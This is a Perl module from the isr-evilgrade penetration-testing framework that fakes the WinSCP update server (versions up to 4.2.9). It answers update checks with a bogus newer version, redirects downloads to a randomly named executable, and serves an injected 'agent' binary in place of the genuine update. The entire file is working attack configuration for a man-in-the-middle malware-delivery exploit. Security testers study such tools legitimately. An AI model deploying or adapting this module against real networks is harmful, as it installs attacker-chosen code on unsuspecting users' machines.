###############
# winscp.pm
#
# Copyright 2010 Francisco Amato
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::winscp;

use strict;
use Data::Dump qw(dump);

use isrcore::utils;

my $base = {
    'name'        => 'WinSCP',
    'version'     => '1.0',
    'appver'      => '<= 4.2.9',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>'],
    'description' => qq{},
    'vh'          => 'winscp.net',
    'request'     => [
        {   'req'    => '/updates.php',          #regex friendly
            'type'   => 'string',                #file|string|agent|install
            'method' => '',                      #any
            'bin'    => '',
            'string' => "version=<%VERSION%>",
            'parse'  => '1',
            'file'   => ''
        },

        #eng/docs/history
        {   'req'     => 'history',                 #regex friendly
            'type'    => 'string',                  #file|string|agent|install
            'method'  => '',                        #any
            'bin'     => '',
            'string'  => '',
            'parse'   => '0',
            'file'    => '',
            'cheader' => "HTTP/1.1 302 Found\r\n"
                . "Location: http://www.winscp.net/eng/docs/history\r\n"
                . "Content-Length: 0 \r\n"
                . "Connection: close \r\n\r\n",
        },
        {   'req'    => 'download.php',             #regex friendly
            'type'   => 'string',                   #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '',
            'string' =>
                '<html><script>window.location="http://winscp.net/winscpupdate<%RND1%>.exe"</script></html>',
            'parse' => '1',
            'file'  => '',
        },

        {   'req'    => '.exe',                     #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
        {   'req'     => '[\w\W]+',                 #regex anything
            'type'    => 'string',                  #file|string|agent|install
            'method'  => '',                        #any
            'bin'     => '',
            'string'  => '',
            'parse'   => '0',
            'file'    => '',
            'cheader' => "HTTP/1.1 302 Found\r\n"
                . "Location: http://www.winscp.net/\r\n"
                . "Content-Length: 0 \r\n"
                . "Connection: close \r\n\r\n",
        },

    ],

    #Options
    'options' => {
        'agent' =>
            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'version' => {
            'val' =>
                "'9.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1)",
            'hidden'  => 1,
            'dynamic' => 1,
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1,
        },
    }
};

#TODO: data1,data2 mac differences

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
